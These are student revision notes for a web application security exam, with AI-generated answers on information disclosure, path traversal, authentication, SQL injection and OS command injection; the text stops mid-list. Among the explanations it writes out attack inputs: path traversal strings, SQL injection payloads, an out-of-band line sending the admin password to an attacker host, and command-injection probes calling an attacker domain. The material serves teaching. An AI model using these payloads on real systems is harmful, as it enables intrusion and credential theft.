# Web Application Security Theory

Notes for our upcoming theory exam - here, I have centralized all the past paper and mock questions we have been given, to be studied. Each topic is under a H2 Header.<br>
Under each question, there is a **Answer** and **Bullets** dropdown. The Bullets dropdown is essentially the answer but condensed - making it useful to look at if you're trying to recall the answer yourself.<br>
With a total of 58 questions, if you spend (avg) 8 minutes per question, that covers the entire module in under 8 hours, which just proves a lot quicker than the 999 slides imo.<br>
Please note all answers are AI generated, but created with a decent prompt. I used Claude AI which has proven super reliable in my experience, and I believe my prompt ensures reliable accurate answers. The answers are purposefully dense, in order to convey the entire idea behind the answer, to strengthen understanding. If you find this document useful let me know, glgl.<br>

## Information Disclosure

Web applications often inadvertently expose sensitive internal information that attackers can leverage to formulate more targeted attacks. These exposures range from technical details in error messages to hidden directories and can significantly expand an attacker's knowledge of your systems. Understanding these vulnerabilities requires attention to how applications handle errors, process file requests, and manage sensitive data.

### 1. Describe the key strategies for **preventing information disclosure** vulnerabilities, including specific examples of secure practices.

<details>
  <summary>Answer</summary>
  
  Preventing information disclosure requires a comprehensive approach addressing several attack vectors. Organizations should implement strict access controls, ensuring information is available only to authorized users through proper authentication and authorization mechanisms. Regular security reviews of application code and configuration are essential, particularly focusing on error handling to prevent leakage of sensitive details in error messages.
  
  Specific secure practices include implementing custom error pages that provide minimal technical information, disabling directory listing on web servers, and removing developer comments from production code. Organizations should also employ proper HTTP header configuration, including Content-Security-Policy and X-Content-Type-Options headers to prevent unintended information exposure.
  
  Data sanitization before display ensures sensitive information isn't leaked to users, while secure configuration management prevents common misconfigurations like verbose server banners or default credential exposure. Regular security testing, including vulnerability scanning and penetration testing, can identify potential information leakage before attackers discover it.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Access controls** - limit information to authorized users
  * **Custom error pages** - prevent stack traces/system details
  * **Disable directory listing** on web servers
  * **Remove comments/metadata** from production code
  * **Secure HTTP headers** (CSP, X-Content-Type-Options)
  * **Data sanitization** before display
  * **Configuration hardening** - remove default credentials/banners
  * **Regular security testing** - identify leakage points
  * **Update frameworks/libraries** - patch known vulnerabilities
</details>

### 2. Identify and explain the primary **causes of information disclosure** vulnerabilities, providing one specific example.

<details>
  <summary>Answer</summary>
  
  Information disclosure vulnerabilities primarily stem from inadequate security controls and improper handling of sensitive data. The main causes include misconfigured servers and applications, where default settings often prioritize functionality over security. Improper error handling is another significant cause, where detailed error messages expose internal system information, stack traces, or database queries.
  
  Insufficient access controls frequently lead to information disclosure when applications fail to verify that users are authorized to access requested resources. Metadata leakage occurs when developers overlook information embedded in files, such as document properties or code comments.
  
  A specific example is verbose error messages in a web application that reveal SQL query structure when malformed input is provided. When a user submits specially crafted input to break a query, the application might return an error message containing database type, query structure, and table/column names, giving attackers valuable information about the database schema for crafting more targeted attacks.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Misconfigured servers/applications** - default settings prioritize function over security
  * **Improper error handling** - exposing stack traces, queries
  * **Insufficient access controls** - failing to verify authorization
  * **Metadata leakage** - comments, document properties
  * **Example**: Verbose SQL errors revealing database structure to attackers
</details>

### 3. Summarise why mitigating **information disclosure** vulnerabilities is critical for web security and how it contributes to organisational safety.

<details>
  <summary>Answer</summary>
  
  Mitigating information disclosure vulnerabilities is fundamental to web security as it prevents attackers from gathering intelligence about systems and applications. Such intelligence forms the reconnaissance phase of more sophisticated attacks, where seemingly innocuous information can be combined to develop targeted exploits. By preventing information leakage, organizations maintain a secure posture by adhering to the principle of least privilege—revealing only what users need to know.
  
  For organizational safety, preventing information disclosure helps protect intellectual property, sensitive customer data, and business processes. It also supports regulatory compliance with frameworks like GDPR, HIPAA, and PCI-DSS, which mandate protection of specific information types. Additionally, it protects an organization's reputation by preventing public exposure of security weaknesses or internal system details that could undermine customer trust and confidence.
</details>

<details>
  <summary>Bullets</summary>
  
  * Prevents **reconnaissance** for advanced attacks
  * Maintains **principle of least privilege**
  * Protects **intellectual property** and sensitive data
  * Ensures **regulatory compliance** (GDPR, HIPAA, PCI-DSS)
  * Preserves **organizational reputation** and customer trust
  * Reduces **attack surface** by limiting exposed information
  * Prevents exposing **security weaknesses** to potential attackers
</details>

### 4. How do attackers exploit **information disclosure** vulnerabilities, and what role does a tool like **Burp Suite** play in identifying these vulnerabilities?

<details>
  <summary>Answer</summary>
  
  Attackers exploit information disclosure vulnerabilities through various techniques including directory traversal, where they navigate outside intended directories to access sensitive files. They manipulate input parameters to trigger error messages that reveal system information, and intercept network traffic to examine headers and responses for valuable metadata. Attackers also examine source code comments for hardcoded credentials or security notes, and probe server misconfigurations like directory listing or verbosity settings.
  
  Burp Suite plays a crucial role in identifying these vulnerabilities through several specialized functions. Its Proxy tool intercepts requests/responses to analyze disclosed information, while the Scanner automatically detects common disclosure issues. The Repeater allows manipulation of requests to trigger error conditions, and the Intruder facilitates automated probing of parameters to discover information leakage patterns. Burp's Target Site Map builds a comprehensive view of application structure, revealing unintentionally exposed resources, and its Engagement Tools document and organize discovered vulnerabilities systematically.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Exploitation techniques**:
    * Directory traversal to access sensitive files
    * Parameter manipulation to trigger errors
    * Traffic interception for metadata analysis
    * Source code examination for comments/credentials
    * Probing misconfigurations
  
  * **Burp Suite capabilities**:
    * Proxy - intercepts/analyzes responses
    * Scanner - automates vulnerability detection
    * Repeater - tests error conditions
    * Intruder - discovers leakage patterns
    * Site Map - reveals exposed resources
</details>

### 5. Discuss the potential **impacts of information disclosure** vulnerabilities on users and organisations, with one practical example.

<details>
  <summary>Answer</summary>
  
  Information disclosure vulnerabilities can significantly impact both users and organizations. For users, personal data exposure can lead to identity theft, financial fraud, or privacy violations. Users may also experience account compromise if authentication details are leaked, and suffer from targeted phishing attacks built on disclosed information about their relationships with organizations.
  
  Organizations face reputational damage when breaches occur, potentially leading to customer loss and decreased market value. They may incur financial losses through regulatory fines for non-compliance with data protection laws, remediation costs, and potential legal actions from affected parties. Strategic disadvantages emerge when competitors gain access to proprietary information or business strategies.
  
  A practical example occurred in 2017 when Equifax suffered a data breach exposing personal information of 147 million people. The breach, partly facilitated by information disclosure vulnerabilities, resulted in $700 million in settlements, significant stock value decline, and lasting reputational damage. Exposed individuals faced increased risk of identity theft and fraud, demonstrating how information disclosure can cascade into severe consequences for all stakeholders.
</details>

<details>
  <summary>Bullets</summary>
  
  * **User impacts**:
    * Identity theft/financial fraud
    * Account compromise
    * Privacy violations
    * Targeted phishing vulnerability
  
  * **Organizational impacts**:
    * Reputational damage
    * Financial losses (fines, remediation)
    * Regulatory non-compliance penalties
    * Competitive disadvantage
  
  * **Example**: Equifax breach (2017) - exposed 147M records, $700M settlement, stock decline
</details>

### 6. What are **information disclosure** vulnerabilities, and why are they significant in web security?

<details>
  <summary>Answer</summary>
  
  Information disclosure vulnerabilities occur when web applications inadvertently reveal sensitive information to unauthorized parties. These exposures include technical data such as software versions, database schemas, or directory structures; sensitive business data including customer records or intellectual property; or system information like user accounts, internal IP addresses, or file locations.
  
  These vulnerabilities are significant because they enable attackers to build detailed knowledge of target systems, facilitating more sophisticated attacks. They represent a fundamental security principle breach—the principle of least privilege—by revealing information users shouldn't access. Information disclosure often serves as the reconnaissance phase of an attack chain, where seemingly minor technical details combine to create significant exposures.
  
  These vulnerabilities are particularly dangerous because they frequently go undetected, not immediately triggering security alerts like active exploitation attempts. They can exist in production systems for extended periods, continuously leaking sensitive data while organizations remain unaware of the exposure.
</details>

<details>
  <summary>Bullets</summary>
  
  * Unintended exposure of sensitive data to unauthorized parties
  * Reveals technical data (versions, schemas), business data, or system details
  * Enables **reconnaissance** for sophisticated attacks
  * Violates **principle of least privilege**
  * Often **undetected** - doesn't trigger security alerts
  * Creates foundation for **attack chains**
  * Provides attackers intelligence about target environment
</details>

## Path Traversal

This vulnerability allows attackers to navigate beyond intended directory boundaries to access files and directories stored outside the web root folder. By manipulating variables that reference files with dot-dot-slash (../) sequences and similar techniques, attackers can potentially access configuration files, credentials, and other sensitive assets. Effective mitigation requires strong input validation and proper file handling practices.

### 1. Describe two techniques attackers use to exploit **path traversal** vulnerabilities.

<details>
  <summary>Answer</summary>
  
  Attackers exploit path traversal vulnerabilities using several sophisticated techniques. One primary technique is the use of directory traversal sequences like "../" (dot-dot-slash) to navigate outside intended directories. Attackers chain these sequences (e.g., "../../../../etc/passwd") to reach system files, often targeting configuration files containing credentials or sensitive system information.
  
  A second technique involves encoding and obfuscation to bypass security filters. Attackers may URL-encode traversal characters (%2e%2e%2f for "../"), double-encode them (%252e%252e%252f), or use alternate representations like "..\" or "...." (where filters remove dots but leave enough to form valid traversal). Some attackers combine these with absolute paths, nullbytes to terminate strings in certain languages, or non-standard characters that normalize to traversal sequences when processed by the application, effectively circumventing security controls while maintaining the traversal functionality.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Directory traversal sequences**
    * Using "../" to navigate outside directories
    * Chaining sequences to reach system files
    * Targeting configuration files with credentials
  
  * **Encoding and obfuscation**
    * URL encoding (%2e%2e%2f)
    * Double encoding (%252e%252e%252f)
    * Alternate representations (..\\, ....)
    * Combining with absolute paths
    * Using nullbytes to terminate strings
</details>

### 2. Define **path traversal** vulnerabilities and explain their potential impacts.

<details>
  <summary>Answer</summary>
  
  Path traversal vulnerabilities, also known as directory traversal, occur when web applications inadequately validate user-supplied input that references files or directories. These vulnerabilities allow attackers to access files and directories outside the intended application directory by manipulating file paths, typically using "../" sequences to navigate up directory levels.
  
  The impacts of successful path traversal attacks are severe and multi-faceted. They enable unauthorized access to sensitive files including configuration files containing credentials, user data files with personal information, or source code revealing application logic and additional vulnerabilities. Attackers can leverage obtained credentials to gain deeper system access, potentially achieving privilege escalation when sensitive system files are compromised. In some cases, attackers might modify critical files if write permissions exist, potentially inserting malicious code or corrupting application functionality, leading to system instability or creating backdoors for persistent access.
</details>

<details>
  <summary>Bullets</summary>
  
  * Web application fails to validate file path inputs
  * Allows accessing files outside intended directories
  * **Impacts**:
    * Unauthorized sensitive file access (configs, credentials)
    * Source code exposure
    * User data compromise
    * System file access
    * Privilege escalation
    * File modification if write permissions exist
    * System instability
    * Potential backdoor creation
</details>

### 3. Provide an example of code used to **mitigate path traversal**.

<details>
  <summary>Answer</summary>
  
  To mitigate path traversal vulnerabilities, developers should implement proper input validation and use secure coding practices. A typical example in a Node.js application might include:

  ```javascript
  const path = require('path');
  const fs = require('fs');

  function getFile(userInput) {
    // Whitelist approach - define allowed files
    const allowedFiles = ['report1.pdf', 'report2.pdf', 'public.txt'];
    
    if (!allowedFiles.includes(userInput)) {
      return null; // Reject if not in whitelist
    }
    
    // Normalize path to resolve any directory traversal attempts
    const filePath = path.normalize(userInput);
    
    // Ensure the normalized path doesn't contain traversal sequences
    if (filePath.includes('..')) {
      return null; // Reject if traversal detected
    }
    
    // Use path.join with base directory to ensure we stay within intended directory
    const basePath = '/var/www/app/files/';
    const fullPath = path.join(basePath, filePath);
    
    // Final check: ensure the resulting path starts with the base path
    if (!fullPath.startsWith(basePath)) {
      return null; // Additional security check
    }
    
    // Safe to access the file
    return fs.readFileSync(fullPath);
  }
  ```
</details>

<details>
  <summary>Bullets</summary>
  
  * **Key mitigation techniques in code**:
    * Whitelist valid file names/resources
    * Path normalization to resolve traversal sequences
    * Explicit traversal sequence detection
    * Base directory enforcement
    * Path verification before access
    * Input sanitization
    * Use filesystem abstraction libraries
</details>

### 4. Provide an example of how a poorly secured application might be exploited by a **path traversal** attack.

<details>
  <summary>Answer</summary>
  
  A poorly secured e-commerce application might include a feature to view product images through a URL parameter, such as: https://example.com/products/view.php?image=product123.jpg
  
  Behind the scenes, the vulnerable code might directly use this parameter to construct a file path without proper validation:

  ```php
  <?php
  $imagePath = "/var/www/products/images/" . $_GET['image'];
  if (file_exists($imagePath)) {
      header("Content-Type: image/jpeg");
      readfile($imagePath);
  }
  ?>
  ```

  An attacker could exploit this vulnerability by manipulating the 'image' parameter to traverse directories:
  https://example.com/products/view.php?image=../../../../etc/passwd
  
  This would cause the application to construct the path "/var/www/products/images/../../../../etc/passwd", which resolves to "/etc/passwd" after path traversal sequences are processed. The application would then read and display the system's password file, revealing sensitive user account information. The attacker could similarly access database configuration files containing credentials, application source code revealing further vulnerabilities, or other sensitive system files.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Vulnerable scenario**: E-commerce image viewer
  * **Vulnerable URL**: example.com/products/view.php?image=product123.jpg
  * **Vulnerable code**: directly appends user input to file path
  * **Attack method**: Modify parameter to `../../../../etc/passwd`
  * **Result**: Application reads/displays system password file
  * **Further targets**: Database configs, source code, system files
</details>

### 5. Explain two key methods to **prevent path traversal** vulnerabilities.

<details>
  <summary>Answer</summary>
  
  Two key methods to prevent path traversal vulnerabilities focus on input validation and access control. The first method involves implementing strict input validation using a whitelist approach. This restricts file access to a predefined set of allowed files or resources, rejecting any inputs not explicitly permitted. Developers should normalize all file paths (resolve symbolic links and remove redundant traversal sequences) before validation, and explicitly check for path traversal sequences like "../" after normalization. Character blacklisting alone is insufficient as attackers can often bypass these restrictions through encoding or alternative representations.
  
  The second method establishes proper access controls through sandboxing and the principle of least privilege. Applications should use dedicated service accounts with minimal permissions rather than running with elevated privileges. File system operations should be isolated to specific directories through chroot environments or container technologies. Additionally, implementing indirect file reference mapping uses identifiers (like numeric IDs) that map to actual resources server-side, eliminating direct path manipulation entirely.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Input validation**
    * Whitelist allowed files/resources
    * Path normalization before checking
    * Explicit traversal sequence detection
    * Reject suspicious patterns
    * Avoid blacklisting alone
  
  * **Access control and sandboxing**
    * Principle of least privilege
    * Service accounts with minimal permissions
    * Directory restrictions
    * Chroot environments/containers
    * Indirect reference mapping
</details>

## Authentication

The gateway to application security, authentication mechanisms verify user identities before granting access. These systems are frequent attack targets due to their critical role and often contain vulnerabilities stemming from design flaws rather than implementation errors. Strong authentication frameworks balance security and usability while implementing appropriate controls against automated attacks.

### 1. Define **authentication** and explain how it differs from **authorisation**.

<details>
  <summary>Answer</summary>
  
  Authentication is the process of verifying the identity of a user, system, or entity attempting to access a resource. It answers the question "Who are you?" by validating claimed identities through various factors such as passwords (knowledge), physical tokens (possession), or biometrics (inherence). The process establishes confidence that users are who they claim to be before granting any system access.
  
  Authorization, by contrast, determines what authenticated users are permitted to do or access within a system. It answers the question "What are you allowed to do?" by checking if the authenticated identity has appropriate permissions for requested resources or actions. Authorization occurs after successful authentication and involves checking access control lists, roles, or permission sets against the authenticated identity.
  
  These processes work sequentially—first determining identity (authentication), then determining privileges (authorization). A fundamental security principle is that authentication must precede authorization, as access rights are meaningless without first establishing identity.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Authentication**
    * Verifies identity ("Who are you?")
    * Validates credentials
    * Uses factors: knowledge/possession/inherence
    * Occurs before authorization
    * Creates authenticated session/context
  
  * **Authorization**
    * Determines permissions ("What can you do?")
    * Checks access rights to resources
    * Applies after authentication succeeds
    * Based on roles/policies/ACLs
    * Enforces principle of least privilege
</details>

### 2. Describe the three principal types of **authentication mechanisms** and provide examples of each.

<details>
  <summary>Answer</summary>
  
  Authentication mechanisms are typically classified into three principal types based on different factors. Knowledge factors (something you know) rely on information that should be known only to the authentic user. Examples include passwords, PINs, security questions, and passphrases. These are widely implemented but vulnerable to various attacks including phishing, brute force, and social engineering.
  
  Possession factors (something you have) authenticate users based on physical items they possess. Examples include hardware tokens generating one-time passwords (OTPs), smartphone authentication apps, smart cards, and physical security keys like YubiKeys. These offer stronger security than knowledge factors alone but can be lost or stolen.
  
  Inherence factors (something you are) utilize physiological or behavioral characteristics unique to individuals. Examples include fingerprint scans, facial recognition, retina/iris scans, voice recognition, and behavioral biometrics like typing patterns. These are difficult to duplicate but present privacy concerns and may have accuracy issues under certain conditions.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Knowledge factors** (something you know)
    * Passwords/passphrases
    * PINs
    * Security questions
    * Pattern locks
  
  * **Possession factors** (something you have)
    * Hardware tokens/OTP generators
    * Mobile authentication apps
    * Smart cards
    * Security keys (FIDO/YubiKey)
  
  * **Inherence factors** (something you are)
    * Fingerprint recognition
    * Facial recognition
    * Voice recognition
    * Behavioral biometrics
</details>

### 3. Identify two common **vulnerabilities in authentication** mechanisms and explain their impact.

<details>
  <summary>Answer</summary>
  
  Brute force vulnerabilities arise when applications lack effective controls against repeated authentication attempts. Without proper rate limiting, account lockouts, or CAPTCHA mechanisms, attackers can systematically try multiple credentials until successful. The impact includes unauthorized access to accounts, potential privilege escalation, and platform-wide credential compromise if successful against administrative accounts. These attacks may also cause denial of service when legitimate users become locked out due to attack attempts.
  
  Credential stuffing vulnerabilities exploit password reuse across multiple sites. When credentials from one breached site are tested against other services, users reusing passwords become vulnerable. The impact is significant: account takeovers across multiple services, potential data theft, financial losses through compromised payment information, and damage to organizational reputation. The scale can be massive—attackers often use automated tools to test thousands of credential pairs simultaneously, achieving high success rates despite the simplicity of implementing preventative measures like multi-factor authentication.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Brute Force Vulnerabilities**
    * Missing attempt limitations
    * No rate limiting/lockouts
    * Absent CAPTCHA protections
    * **Impact**: Unauthorized access, privilege escalation, DoS from lockouts
  
  * **Credential Stuffing**
    * Exploits password reuse
    * Uses leaked credentials from other breaches
    * Automated at scale
    * **Impact**: Mass account takeovers, data theft, financial loss, reputation damage
</details>

### 4. Explain the potential **consequences of authentication vulnerabilities** for an organisation.

<details>
  <summary>Answer</summary>
  
  Authentication vulnerabilities expose organizations to multiple severe consequences. Data breaches commonly result from compromised authentication, leading to unauthorized access to sensitive information including customer data, intellectual property, and financial records. Organizations face significant financial impacts through regulatory fines (e.g., GDPR penalties up to 4% of global revenue), legal settlements from affected parties, remediation costs, and business disruption during incident response.
  
  Reputational damage may be the most enduring consequence, as public trust erodes following security incidents—particularly those involving customer data. Operational disruption occurs when systems require emergency maintenance or when access controls must be reset across the enterprise. If administrative accounts are compromised, attackers can establish persistent access through backdoors or modified configurations, potentially remaining undetected for extended periods while extracting data or preparing larger attacks. Security incidents also frequently trigger regulatory investigations, adding compliance burdens and potential regulatory sanctions beyond initial financial penalties.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Data breaches** - unauthorized sensitive information access
  * **Financial impact** - regulatory fines, legal costs, remediation expenses
  * **Reputational damage** - lost customer trust, brand value decline
  * **Operational disruption** - system downtime, emergency maintenance
  * **Persistent compromise** - backdoors, long-term unauthorized access
  * **Regulatory consequences** - investigations, sanctions, increased scrutiny
  * **Identity theft** - customer/employee credential misuse
</details>

### 5. Outline three strategies to **mitigate authentication vulnerabilities**.

<details>
  <summary>Answer</summary>
  
  Implementing multi-factor authentication (MFA) is a primary mitigation strategy, requiring users to provide two or more verification factors from different categories. This significantly improves security by ensuring that compromised passwords alone are insufficient for access. Even if credentials are leaked, attackers still need additional factors (like physical tokens or biometrics) to gain access.
  
  Robust password policies form a second critical strategy. These should enforce length requirements (minimum 12 characters), complexity rules, and checks against compromised password databases. Organizations should implement secure password storage using strong cryptographic hashing algorithms (like bcrypt or Argon2) with unique salts for each password, preventing rainbow table attacks.
  
  Finally, implementing comprehensive account protection mechanisms provides defense in depth. This includes rate limiting to prevent brute force attacks, intelligent lockout policies that balance security with usability, risk-based authentication that adapts security requirements to context, and secure account recovery flows that resist social engineering. Regular security assessments should evaluate these mechanisms against evolving threats.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Multi-factor authentication**
    * Combine multiple verification factors
    * Hardware tokens/authenticator apps
    * Biometric verification
    * Risk-based MFA triggers
  
  * **Robust password management**
    * Strong length/complexity requirements
    * Secure hashing (bcrypt/Argon2) with salts
    * Breach database checking
    * Regular rotation for sensitive accounts
  
  * **Account protection mechanisms**
    * Rate limiting on attempts
    * Intelligent lockout policies
    * Secure recovery processes
    * Login attempt monitoring/alerting
</details>

### 6. Discuss the role of **multi-factor authentication (MFA)** in securing authentication systems.

<details>
  <summary>Answer</summary>
  
  Multi-factor authentication substantially strengthens authentication security by requiring users to verify their identity through multiple independent factors, typically combining something they know (password), have (token), and/or are (biometric). This approach creates defense in depth—even if one factor is compromised, attackers still face additional barriers to account access.
  
  MFA effectively mitigates various attacks including credential stuffing, password spraying, and phishing, which primarily target single-factor authentication. By requiring a second verification channel, MFA prevents attackers from accessing accounts even with valid passwords. Organizations implementing MFA typically see up to 99.9% reduction in account compromise rates compared to password-only systems.
  
  While implementing MFA, organizations must balance security with usability. Progressive implementation approaches include risk-based authentication (applying MFA selectively based on risk signals) and adaptive authentication (adjusting requirements based on contextual factors). Consideration must also be given to recovery mechanisms, as lost MFA devices create legitimate access challenges that must be securely addressed without introducing new vulnerabilities.
</details>

<details>
  <summary>Bullets</summary>
  
  * Requires multiple independent verification factors
  * Creates **defense in depth** - multiple barriers to overcome
  * Mitigates credential stuffing/password spraying/phishing
  * Reduces account compromise by ~99.9%
  * Can be **risk-based** (selective application) or **adaptive** (context-aware)
  * Balances security with usability concerns
  * Requires secure recovery mechanisms
  * Most effective security control for authentication
</details>

## SQLi

A critical injection vulnerability that occurs when user-supplied data is incorporated into database queries without proper sanitization. This vulnerability can lead to unauthorized data access, modification, or destruction and potentially complete system compromise. Attackers exploit these flaws by inserting specially crafted SQL code that alters the intended behavior of backend queries.

### 1. Define **SQL Injection** and explain its potential impact on web applications.

<details>
  <summary>Answer</summary>
  
  SQL Injection is a code injection technique where an attacker inserts malicious SQL statements into entry fields in a web application. These malicious statements are then executed by the underlying database when the application processes the input. The vulnerability occurs when user input is incorrectly filtered or sanitized before being used in SQL statements.
  
  The potential impact of SQL Injection on web applications is severe and multi-faceted. Attackers can bypass authentication mechanisms, gaining unauthorized access to user accounts including administrative ones. They can extract sensitive data from databases, including personal information, credit card details, and intellectual property. In more extreme cases, attackers might modify or delete database contents, compromising data integrity or causing permanent data loss. Some SQL Injection attacks can even escalate to complete server compromise through execution of operating system commands via specific database functions.
</details>

<details>
  <summary>Bullets</summary>
  
  * Insertion of malicious SQL code through application inputs
  * Exploits inadequate input validation/sanitization
  * **Impacts**:
    * Authentication bypass
    * Unauthorized data access/extraction
    * Data modification/deletion
    * Database structure exposure
    * Server compromise (in advanced cases)
    * Regulatory violations/legal consequences
</details>

### 2. Describe three types of **SQL Injection** vulnerabilities and provide examples of how each is exploited.

<details>
  <summary>Answer</summary>
  
  In-band SQL Injection occurs when attackers can use the same communication channel to both launch the attack and gather results. Error-based injection exploits verbose error messages that reveal database information. For example, entering `' OR 1=1 --` into a login form might trigger an error revealing query structure, or execute unintended logic allowing authentication bypass. Union-based injection uses the UNION operator to combine results from injected queries with the original query, like `' UNION SELECT username, password FROM users --`, directly extracting data from different tables.
  
  Blind SQL Injection happens when the application doesn't display database error messages. In boolean-based blind injection, attackers ask the database true/false questions by observing different responses. For example, `username=admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --` tests if the first character of admin's password is 'a'.
  
  Out-of-band SQL Injection utilizes different channels for launching attacks and collecting results. An attacker might inject commands that cause the database to make DNS or HTTP requests containing extracted data: `'; EXEC master..xp_dirtree '//attacker-server.com/'+(SELECT password FROM users WHERE username='admin')+'/';--`.
</details>

<details>
  <summary>Bullets</summary>
  
  * **In-band SQLi**:
    * Same channel for attack and results
    * Error-based: exploits error messages (`' OR 1=1 --`)
    * Union-based: combines queries (`' UNION SELECT username, password FROM users --`)
  
  * **Blind SQLi**:
    * No direct error feedback
    * Boolean-based: true/false responses (`' AND 1=1 --` vs `' AND 1=0 --`)
    * Time-based: delays indicate success (`'; IF 1=1 WAITFOR DELAY '0:0:5' --`)
  
  * **Out-of-band SQLi**:
    * Different channel for results
    * Forces database to make external connections
    * Example: DNS/HTTP requests with data (`EXEC master..xp_dirtree '//attacker.com/'+(SELECT password)+'/'`)
</details>

### 3. How can **SQL Injection** vulnerabilities be detected, and what methods do attackers use to exploit them?

<details>
  <summary>Answer</summary>
  
  SQL Injection vulnerabilities are detected through both manual and automated techniques. Manual testing involves submitting special characters (like single quotes, double quotes, semicolons) and observing application responses for errors or unexpected behavior. Testers also use logical operators (AND/OR) and SQL-specific payloads to verify vulnerability presence. Automated tools like vulnerability scanners and dedicated SQLi testing applications systematically probe inputs with predefined payloads, analyzing responses for indicators of vulnerability.
  
  Attackers exploit SQLi through several methods: manipulating logical operators to alter query logic (e.g., `' OR 1=1 --`); using UNION statements to append additional queries; leveraging subqueries to extract information; employing batch queries to execute multiple statements; and exploiting out-of-band techniques for data exfiltration. Advanced exploitation includes fingerprinting the database type to use database-specific functions and syntax, navigating database schemas to locate sensitive tables, and accessing the filesystem through specific database functions when available.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Detection methods**:
    * Manual testing with special characters (' " ;)
    * Logical operators (AND/OR)
    * Automated scanners
    * Proxy interception tools
    * Code reviews
  
  * **Exploitation techniques**:
    * Logic manipulation (`' OR 1=1 --`)
    * UNION attacks for data extraction
    * Batch/stacked queries
    * Database fingerprinting
    * Schema enumeration
    * File system access
    * Blind injection techniques
</details>

### 4. Explain the concept of **parameterised queries** and discuss their effectiveness in preventing **SQL Injection** attack.

<details>
  <summary>Answer</summary>
  
  Parameterized queries, also called prepared statements, separate SQL code from data by defining the SQL structure first with placeholders for user inputs, then binding these inputs as parameters rather than concatenating them into the query string. The database parses, compiles, and optimizes the query before input values are substituted, ensuring they're treated strictly as data values, not executable code.
  
  This approach effectively prevents SQL injection because user inputs cannot alter the query's structure regardless of their content. Even if a malicious input contains SQL syntax, it will only be interpreted as a literal value within the predefined query structure. Parameterized queries are highly effective, providing nearly complete protection against SQL injection when properly implemented across all database interactions.
  
  Most programming languages and frameworks offer native support for parameterized queries. For example, in PHP with PDO: `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?"); $stmt->execute([$username]);`. Similar mechanisms exist across all major development technologies, making this protection widely accessible and straightforward to implement.
</details>

<details>
  <summary>Bullets</summary>
  
  * SQL structure defined with placeholders before data binding
  * Database parses query before parameter insertion
  * User input treated strictly as data, never code
  * Nearly 100% effective when properly implemented
  * Supported by all major programming languages/frameworks
  * Example: `prepare("SELECT * FROM users WHERE id = ?"); execute([$id]);`
  * Additional benefits: performance improvement, cleaner code
</details>

### 5. SQL injection vulnerabilities can occur at any location within the query, and within different query types. Name three common locations where **SQL injection** can arise.

<details>
  <summary>Answer</summary>
  
  SQL injection vulnerabilities commonly arise in WHERE clauses when filtering records based on user input. For example, in a login query like `SELECT * FROM users WHERE username='$username' AND password='$password'`, unsanitized input in either variable creates injection points. Attackers can manipulate these conditions to bypass authentication or extract data.
  
  INSERT statements are another frequent vulnerability location, particularly in forms that add user-provided data to databases. In queries like `INSERT INTO users (username, email) VALUES ('$username', '$email')`, malicious input can break out of the string context and inject additional SQL commands, potentially manipulating other tables or adding unauthorized data.
  
  ORDER BY clauses present a third common vulnerability point when applications allow users to sort results. Queries like `SELECT * FROM products ORDER BY $column $direction` can be exploited when $column isn't properly validated, allowing attackers to inject subqueries or test for vulnerabilities without triggering obvious errors, as the syntax for column names differs from string contexts.
</details>

<details>
  <summary>Bullets</summary>
  
  * **WHERE clause** - filtering manipulation (`username='admin' --`)
    * Authentication bypass
    * Data filtering circumvention
  
  * **INSERT statements** - form submissions
    * Breaking string context
    * Injecting multiple values/commands
  
  * **ORDER BY clause** - sorting parameters
    * Column name manipulation
    * Subquery injection
    * Often lacks quotes, different syntax
  
  * Other locations: UPDATE statements, LIMIT clauses, dynamic table names
</details>

## OS Command Injection

This vulnerability occurs when applications pass unsafe user-supplied data to a system shell for execution. Unlike many other vulnerabilities that affect only the application or database, command injection can give attackers direct access to the underlying operating system. These attacks are particularly dangerous as they often lead to complete system compromise with the same privileges as the application process.

### 1. What is **OS Command injection**, and why is it considered a critical security vulnerability?

<details>
  <summary>Answer</summary>
  
  OS Command Injection is a vulnerability that occurs when an application passes unsafe user-supplied data as part of a system command. The attacker manipulates this input to execute arbitrary commands on the hosting operating system with the same privileges as the application process.
  
  This vulnerability is classified as critical because it bypasses application boundaries to directly interact with the underlying operating system. Successful exploitation grants attackers the ability to execute system commands, potentially leading to complete server compromise. Attackers can access sensitive files, modify system configurations, establish persistence mechanisms, pivot to other systems in the network, or launch additional attacks from the compromised server.
  
  The severity is amplified because many web applications run with elevated privileges, giving attackers significant system access. Unlike other vulnerabilities that might expose specific application data, command injection exposes the entire server environment, including data from all hosted applications and services. This direct OS access makes remediation complex and detection difficult, particularly in cases of subtle command injection.
</details>

<details>
  <summary>Bullets</summary>
  
  * Executes arbitrary system commands through application
  * Attacker input passed unsafely to shell/system functions
  * **Critical because**:
    * Bypasses application boundaries
    * Accesses underlying OS directly
    * Executes with application's privileges
    * Enables file access, configuration changes
    * Allows lateral movement
    * Often provides complete system control
    * Difficult to detect post-exploitation
</details>

### 2. Describe how an attacker can confirm the presence of an **OS command injection** vulnerability in a web application.

<details>
  <summary>Answer</summary>
  
  To confirm OS command injection vulnerability, attackers first identify potential injection points where applications might execute system commands, such as features that ping domains or process files. They then test these points with command separators appropriate for the target operating system, including semicolons (;), pipes (|), ampersands (&), double ampersands (&&), or backticks (`) to determine if additional commands can be executed.
  
  A common verification technique involves injecting commands that produce observable results without causing damage. For example, adding `& ping -c 4 127.0.0.1 &` to input may create a noticeable time delay if the ping command executes. Similarly, harmless commands like `whoami` or `id` can reveal user context, while echoing unique strings (e.g., `& echo commandinjectiontest &`) confirms command execution if the string appears in the response.
  
  For more definitive proof in blind scenarios, attackers might use time-based verification by injecting commands like `& sleep 10 &` and observing response delay, or establish outbound connections with commands like `& nslookup uniquestring.attacker-controlled-domain.com &` to confirm exploitation through DNS logs.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Identify injection points** (ping/file processing features)
  * **Test command separators**:
    * Windows: `&`, `&&`, `|`, `||`
